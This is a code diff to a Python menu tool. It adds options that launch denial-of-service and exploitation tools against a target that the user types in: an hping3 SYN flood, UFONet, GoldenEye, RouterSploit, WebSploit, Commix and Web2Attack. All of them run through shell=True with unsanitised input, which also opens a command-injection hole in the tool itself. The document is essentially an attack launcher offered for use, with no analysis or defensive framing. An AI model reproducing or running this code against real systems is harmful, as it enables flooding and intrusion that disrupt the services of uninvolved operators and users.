@@ -99,6 +99,39 @@ def display_books(books):
         print(f"Link: {book}")
         print("-" * 20)
 
+# Define functions for additional tools
+def run_asyncrone():
+    command = "asyncrone"
+    subprocess.run(command, shell=True)
+
+def run_syn_flood(target_ip):
+    command = f"hping3 -S --flood -V {target_ip}"
+    subprocess.run(command, shell=True)
+
+def run_ufo_net(target_url):
+    command = f"ufonet -a {target_url}"
+    subprocess.run(command, shell=True)
+
+def run_goldeneye(target_url):
+    command = f"goldeneye {target_url}"
+    subprocess.run(command, shell=True)
+
+def run_routersploit():
+    command = "rsf"
+    subprocess.run(command, shell=True)
+
+def run_websploit():
+    command = "websploit"
+    subprocess.run(command, shell=True)
+
+def run_commix(target_url):
+    command = f"commix --url={target_url}"
+    subprocess.run(command, shell=True)
+
+def run_web2attack():
+    command = "web2attack"
+    subprocess.run(command, shell=True)
+
 def display_ui():
     while True:
         print("""
@@ -118,10 +151,18 @@ def display_ui():
         [7] Scrape Chinese Textbooks
         [8] Stress Test a Custom URL
         [9] Web Crawling
-        [10] Exit
+        [10] Run Asyncrone
+        [11] Run SYN Flood
+        [12] Run UFOnet
+        [13] Run GoldenEye
+        [14] Run RouterSploit
+        [15] Run WebSploit
+        [16] Run Commix
+        [17] Run Web2Attack
+        [18] Exit
         """)
 
-        choice = input("Select the method (1-10): ").strip()
+        choice = input("Select the method (1-18): ").strip()
         ip_address = None
 
         if choice == "1":
@@ -147,7 +188,7 @@ def display_ui():
             nearby_options = ["Option1", "Option2", "Option3"]
             print("Select a nearby device:")
             for i, option in enumerate(nearby_options, start=1):
-                print(f"[i] {option}")
+                print(f"[{i}] {option}")
             print("[4] Other (Enter MAC address or IP)")
             device_choice = input("Select (1-4): ").strip()
             if device_choice == "4":
@@ -189,6 +230,34 @@ def display_ui():
             print("Starting web crawling...")
             web_crawler(start_url, max_depth)
         elif choice == "10":
+            print("Running Asyncrone...")
+            run_asyncrone()
+        elif choice == "11":
+            target_ip = input("Enter the target IP address for SYN Flood: ").strip()
+            print(f"Running SYN Flood on {target_ip}...")
+            run_syn_flood(target_ip)
+        elif choice == "12":
+            target_url = input("Enter the target URL for UFOnet: ").strip()
+            print(f"Running UFOnet on {target_url}...")
+            run_ufo_net(target_url)
+        elif choice == "13":
+            target_url = input("Enter the target URL for GoldenEye: ").strip()
+            print(f"Running GoldenEye on {target_url}...")
+            run_goldeneye(target_url)
+        elif choice == "14":
+            print("Running RouterSploit...")
+            run_routersploit()
+        elif choice == "15":
+            print("Running WebSploit...")
+            run_websploit()
+        elif choice == "16":
+            target_url = input("Enter the target URL for Commix: ").strip()
+            print(f"Running Commix on {target_url}...")
+            run_commix(target_url)
+        elif choice == "17":
+            print("Running Web2Attack...")
+            run_web2attack()
+        elif choice == "18":
             print("Exiting...")
             break
         else:
